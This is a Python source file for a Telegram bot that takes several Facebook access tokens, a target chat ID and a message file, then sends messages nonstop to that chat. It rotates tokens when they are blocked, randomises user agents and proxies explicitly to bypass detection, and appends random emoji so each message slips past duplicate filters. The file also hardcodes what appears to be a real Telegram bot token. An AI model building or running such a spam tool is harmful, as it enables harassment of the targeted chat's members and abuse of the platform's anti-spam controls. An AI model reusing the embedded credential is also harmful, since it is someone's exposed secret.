import requests
import threading
import logging
import random
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = "7635741820:AAGAks8tA7qTJb5W6lSOpE1uMqG2Y9POvdg"

# Logging setup
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

# Conversation states
TOKEN_COUNT, GET_TOKENS, CHAT_ID, MESSAGE_FILE = range(4)

# Global variables
is_sending_active = True
PROXIES = [None]  # Add proxy if needed

# User-Agent list to bypass detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; U; Android 9; en-US; Redmi Note 7 Pro)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.55",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"
]

EMOJI_LIST = ["😊", "🔥", "💥", "🎯", "🚀", "✔️"]

def get_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.7"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }

def get_random_proxy():
    return {"http": random.choice(PROXIES), "https": random.choice(PROXIES)}

def randomize_message(message):
    words = message.split()
    if len(words) > 3:
        index = random.randint(0, len(words) - 1)
        words[index] += random.choice(EMOJI_LIST)
    return " ".join(words)

def send_facebook_message(access_token, chat_id, message):
    url = f"https://graph.facebook.com/v15.0/t_{chat_id}/"
    headers = get_random_headers()
    payload = {"access_token": access_token, "message": message}

    response = requests.post(url, json=payload, headers=headers, proxies=get_random_proxy())

    if response.status_code == 200:
        return True
    elif response.status_code in [403, 400]:  # Token blocked or expired
        logging.warning(f"⚠ Token blocked: {access_token[:10]}... Switching!")
        return False
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active
    is_sending_active = True
    await update.message.reply_text("🤖 How many Facebook tokens do you want to use?")
    return TOKEN_COUNT

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active
    is_sending_active = False
    await update.message.reply_text("🛑 Stopping message sending.")
    return ConversationHandler.END

async def get_token_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        token_count = int(update.message.text)
        if token_count < 1:
            raise ValueError
        context.user_data["token_count"] = token_count
        context.user_data["tokens"] = []
        await update.message.reply_text(f"✅ Send {token_count} tokens one by one.")
        return GET_TOKENS
    except ValueError:
        await update.message.reply_text("❌ Enter a valid number (1 or more).")
        return TOKEN_COUNT

async def get_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["tokens"].append(update.message.text)

    if len(context.user_data["tokens"]) < context.user_data["token_count"]:
        await update.message.reply_text(f"✅ Token {len(context.user_data['tokens'])} saved. Send the next one.")
        return GET_TOKENS
    
    await update.message.reply_text("✅ All tokens saved! Now enter the **Facebook Chat ID**:")
    return CHAT_ID

async def get_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["chat_id"] = update.message.text
    await update.message.reply_text("✅ Chat ID saved! Now upload a **message file (.txt)**:")
    return MESSAGE_FILE

async def receive_message_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = update.message.document
    new_file = await context.bot.get_file(file.file_id)
    file_path = f'./{file.file_name}'
    await new_file.download_to_drive(file_path)

    context.user_data["file_path"] = file_path
    await update.message.reply_text("✅ Message file uploaded! Type /send to start.")
    return ConversationHandler.END

async def send_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active

    tokens = context.user_data.get("tokens", [])
    chat_id = context.user_data.get("chat_id")
    file_path = context.user_data.get("file_path")

    if not tokens or not chat_id or not file_path:
        await update.message.reply_text("❌ Missing token, chat ID, or message file.")
        return

    try:
        with open(file_path, "r") as f:
            messages = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        await update.message.reply_text("❌ Could not read the message file!")
        return

    def send_messages():
        while is_sending_active:
            for i, message in enumerate(messages):
                if not is_sending_active:
                    return

                message = randomize_message(message)  # Make message unique
                current_token = tokens[i % len(tokens)]
                success = send_facebook_message(current_token, chat_id, message)

                if success:
                    logging.info(f"✅ Sent: {message} (Token {i + 1})")
                else:
                    logging.error(f"❌ Failed (Token {i + 1}), switching token")

        logging.info("✅ All messages sent! Restarting...")
        send_messages()  # Restart script after all messages

    threading.Thread(target=send_messages, daemon=True).start()

    await update.message.reply_text("🚀 Messages are being sent nonstop with rotating tokens!")

def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={TOKEN_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_token_count)],
                GET_TOKENS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_tokens)],
                CHAT_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_chat_id)],
                MESSAGE_FILE: [MessageHandler(filters.Document.ALL, receive_message_file)]},
        fallbacks=[]
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("send", send_message))

    app.run_polling()

if __name__ == "__main__":
    main()
